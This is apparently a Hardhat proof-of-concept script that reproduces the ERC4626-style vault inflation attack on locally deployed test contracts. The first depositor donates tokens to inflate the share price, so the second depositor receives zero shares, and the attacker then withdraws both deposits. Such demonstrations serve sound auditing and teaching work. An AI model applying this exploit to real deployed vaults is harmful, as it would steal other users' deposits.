const { ethers } = require("hardhat");

// User 0 deposits 1.
// User 0 donates 100 * 1e18. This inflates the value of each share.
// User 1 deposits 100 * 1e18. This mints 0 shares to user 1.
// User 0 withdraws all 200 * 1e18 + 1.
async function hack() {
  //deploy erc20
  const MyTokenFactory = await ethers.getContractFactory("MyToken");
  const myToken = await MyTokenFactory.deploy();
  myToken.waitForDeployment();
  //deploy vault contract
  const VaultFactory = await ethers.getContractFactory("Vault");
  const vault = await VaultFactory.deploy(myToken);
  await vault.waitForDeployment();

  //define user1 user2
  const [user0, user1] = await ethers.getSigners();
  //premint
  await myToken.mint(user0.address, ethers.parseUnits("200"));
  await myToken.mint(user1.address, ethers.parseUnits("200"));

  //approve
  console.log("/////////user0 deposit 1/////////////");
  await myToken.connect(user0).approve(vault, 1);
  await vault.connect(user0).deposit(1);
  await print(vault, myToken, user0, user1);

  console.log("/////////User 0 donates 100 * 1e18/////////////");
  await myToken.connect(user0).transfer(vault, ethers.parseUnits("100"));
  await print(vault, myToken, user0, user1);

  console.log("/////////User 1 deposits 100 * 1e18/////////////");
  await myToken.connect(user1).approve(vault, ethers.parseUnits("100"));
  await vault.connect(user1).deposit(ethers.parseUnits("100"));
  await print(vault, myToken, user0, user1);

  console.log("/////////User 0 withdraws all 200 * 1e18 + 1/////////////");
  await vault.connect(user0).withdraw(1);
  await print(vault, myToken, user0, user1);
}

async function print(vault, myToken, user0, user1) {
  console.log(
    "[share]user=%s,share=%s",
    user0.address,
    await vault.balanceOf(user0.address)
  );
  console.log(
    "[share]user=%s,share=%s",
    user1.address,
    await vault.balanceOf(user1.address)
  );
  console.log("[share]totalSupply=%s", await vault.totalSupply());
  console.log("[tokenBalance]user0=%s", await myToken.balanceOf(user0));
  console.log("[tokenBalance]user1=%s", await myToken.balanceOf(user1));
  console.log("[tokenBalance]vault=%s", await myToken.balanceOf(vault));
}
hack();
